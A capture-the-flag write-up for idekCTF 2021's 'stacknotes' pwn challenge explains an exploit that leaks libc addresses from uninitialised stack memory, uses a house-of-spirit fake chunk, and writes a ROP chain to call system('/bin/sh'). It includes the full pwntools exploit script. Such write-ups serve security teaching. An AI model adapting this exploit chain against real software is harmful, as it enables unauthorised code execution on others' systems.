# Stacknotes

was pwn challenge from idekCTF 2021

it was a heap challenge,

nice menu as you can see :)

![](https://github.com/nobodyisnobody/write-ups/raw/main/idekCTF.2021/pwn/stacknotes/pics/menu.png)

the source code was provided, but you have to study the binary also to understand how to exploit it...

in the original source code you can see, the stacknote (c)reate function:

![](https://github.com/nobodyisnobody/write-ups/raw/main/idekCTF.2021/pwn/stacknotes/pics/source.png)

you can see that you can allocate a chunk up to 0x1000 bytes, that is allocated with malloca..

but, compiler's produced malloca code shows that chunks below 512 bytes will be allocated on stack (and aligned),

and that chunks above 512 bytes will be allocated with malloc.. that's important to know for the rest of the exploitation

![](https://github.com/nobodyisnobody/write-ups/raw/main/idekCTF.2021/pwn/stacknotes/pics/reverse.png)


So first, we will allocate a chunk on stack, and as alloca does not clear the allocated chunk,

we will leak the usefull values already present on stack in this chunk:

* the libc address of `_IO_2_1_stdout_` that we will use to calculate libc mapping address base..

* an address belonging to the program, that we will use to calculate prog base

No we allocate another chunk of 31bytes on stack , it will be just before our first chunk (as stack grows downward)

and we will create a fake chunk, to make a "house of spirit" attack.. a chunk of 0x300 size...

now we delete our first bloc, that will go in 0x300 chunk list..

when we allocate it again, we will get a chunk on stack (bigger than the original),

where we can directly write our ROP over the return address (and jumping over the canary)..

and that's it we got shell

![](https://github.com/nobodyisnobody/write-ups/raw/main/idekCTF.2021/pwn/stacknotes/pics/gotshell.gif)


ok...

If you understand nothing on my explanation,

you can read the code...

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./stacknotes')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "stacknotes.chal.idek.team", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def create(idx,size):
  p.sendlineafter('> ','c')
  p.sendlineafter('note?\n', str(idx))
  p.sendlineafter('note?\n', str(size))

def write(idx,data):
  p.sendlineafter('> ','w')
  p.sendlineafter('in?\n', str(idx))
  p.sendafter('content:\n', data)

def delete(idx):
  p.sendlineafter('> ','d')
  p.sendlineafter('delete?\n', str(idx))

def view(idx):
  p.sendlineafter('> ','v')
  p.sendlineafter('view\n', str(idx))

# create a buffer on stack
create(0,112)
# leak various usefull address on stack
view(0)

p.recvuntil('Note:\n', drop=True)
buff = p.recv(112)

libc.address = u64(buff[0:8]) - libc.sym['_IO_2_1_stdout_']
print('libc base = '+hex(libc.address))
progbase = u64(buff[8:16]) - 0x2224
print('prog base = '+hex(progbase))

create(1,31)
# House of spirit , create a false chunk on stack
write(1,p64(0)*3+'\x00\x03'+'\x00'*5)
# put fake chunk in tcache list
delete(0)

# get our big chunk allocated on stack
create(2,0x2f0)
view(2)
p.recvuntil('Note:\n', drop=True)
buff = p.recv(0x2f0)
buff = bytearray(buff)

pop_rdi = progbase+rop.find_gadget(['pop rdi', 'ret'])[0]
ret = progbase+rop.find_gadget(['ret'])[0]

# directly wrote a ROP at return address on stack (system('/bin/sh'))
buff[152:160] = p64(pop_rdi)
buff[160:168] = p64(next(libc.search('/bin/sh')))
buff[168:176] = p64(ret)
buff[176:184] = p64(libc.sym['system'])

# write our modified buffer
write(2, bytes(buff))

# got shell
p.sendlineafter('> ','e')

p.sendline('id;cat /flag*')
p.interactive()
```

*nobodyisnobody still pwning things...*

